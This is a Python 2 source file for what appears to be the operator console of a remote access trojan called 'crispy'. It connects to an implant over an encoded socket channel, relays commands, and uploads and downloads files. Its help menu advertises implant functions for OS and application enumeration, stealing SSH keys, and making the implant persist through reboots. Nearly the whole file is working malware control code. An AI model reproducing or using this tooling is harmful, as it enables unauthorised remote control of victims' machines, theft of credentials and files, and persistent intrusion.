import os
import socket
import sys
import os

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)),'..'))

from crispy.encoders.mime import Mime

BUFFER_SIZE = 1024
TCP_IP, TCP_PORT = "localhost", 8080
PROMPT = "%s:%i>> " % (TCP_IP, TCP_PORT)
BANNER = "                                                                     \n \
     ___           ___                       ___           ___                 \n \
    /  /\         /  /\        ___          /  /\         /  /\         ___    \n \
   /  /:/        /  /::\      /  /\        /  /:/_       /  /::\      /__/|    \n \
  /  /:/        /  /:/\:\    /  /:/       /  /:/ /\     /  /:/\:\    |  |:|    \n \
 /  /:/  ___   /  /:/~/:/   /__/::\      /  /:/ /::\   /  /:/~/:/    |  |:|    \n \
/__/:/  /  /\ /__/:/ /:/___ \__\/\:\__  /__/:/ /:/\:\ /__/:/ /:/   __|__|:|    \n \
\  \:\ /  /:/ \  \:\/:::::/    \  \:\/\ \  \:\/:/~/:/ \  \:\/:/   /__/::::\    \n \
 \  \:\  /:/   \  \::/~~~~      \__\::/  \  \::/ /:/   \  \::/       ~\~~\:\   \n \
  \  \:\/:/     \  \:\          /__/:/    \__\/ /:/     \  \:\         \  \:\  \n \
   \  \::/       \  \:\         \__\/       /__/:/       \  \:\         \__\/  \n \
    \__\/         \__\/                     \__\/         \__\/                \n\n"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cipher = Mime()
    
def help_menu():
    info = """
    Remote commands:
        enum_os            - get operating system info
        enum_applications  - get a list of installed applications
        enum_drives        - get a list of drives
        enum_printers      - get a list of printers
        get_ssh_keys       - get any ssh keys
        download           - download [src absolute path] [dest absolute path]
        upload             - upload [src absolute path] [dest absolute path]
        enable_persistence - make implant persistent through reboots
    Local commands:
        session            - show info about current session
        exit               - close down connection to remote host
    """
     
    return info
 
def get_session_info():
    # show length of connection
    # show remote ip and port connected to
    return "need to implement once bind/reverse conn is figured out"

def receiveFile(downFile):
    if os.path.isfile(downFile):
        return False 
    else:   
        try:
            f = open(downFile, 'wb')            
            while True:
                data = cipher.decode(sock.recv(BUFFER_SIZE))
                 
                if not data:
                    break
                elif data == "EOF!EOF!": 
                    f.write(data[:-8])
                    break
                else:
                    f.write(data)
            f.close()
            return True
        except IOError: 
            return False

def uploadFile(upFile):
    try:
        f = open(upFile, 'rb')
        while True:
            data = f.read(BUFFER_SIZE)

            if not data:
                break
            else:
                sock.sendall(cipher.encode(data))        
        f.close()
        sock.sendall(cipher.encode("EOF!EOF!"))
        #have client send a 'complete' message back before we return True
        return True
    except IOError:
        return False    

try:
    sock.connect((TCP_IP, TCP_PORT))
    print BANNER
    
    while True:
        cmd = raw_input(PROMPT).strip()
         
        if cmd == '-h' or cmd == 'help':
            print help_menu()
        elif cmd == 'session':
            print get_session_info()
        elif cmd.startswith('download'):
            print "[+] Downloading " + cmd[9:].split(' ')[0] + "..."
            sock.sendall(cipher.encode(cmd + "\n"))
            
            if receiveFile(cmd[9:].split(' ')[1]):
                print "[+] File transfer complete!\n"
            else:
                print "[!] File transfer failed.\n"
        elif cmd.startswith('upload'): #do I need to md5 the file before and after to determine success?
            sendMeFile = cmd[7:].split(' ')[0]
            print "[+] Uploading " + sendMeFile + "..."
            
            sock.sendall(cipher.encode(cmd + "\n"))
            
            if uploadFile(sendMeFile):
                print "[+] File transfer complete!\n"
            else:
                print "[!] File transfer failed.\n"
        elif cmd == 'exit' or cmd == 'quit':
            sock.shutdown('SHUT_WR') #does this need to be encoded?
            sock.close()
            break
        else:
            sock.sendall(cipher.encode(cmd + "\n"))
            data = cipher.decode(sock.recv(BUFFER_SIZE))
            print data
except:
    print "Couldn't connect to " + TCP_IP
finally:
    sys.exit(0)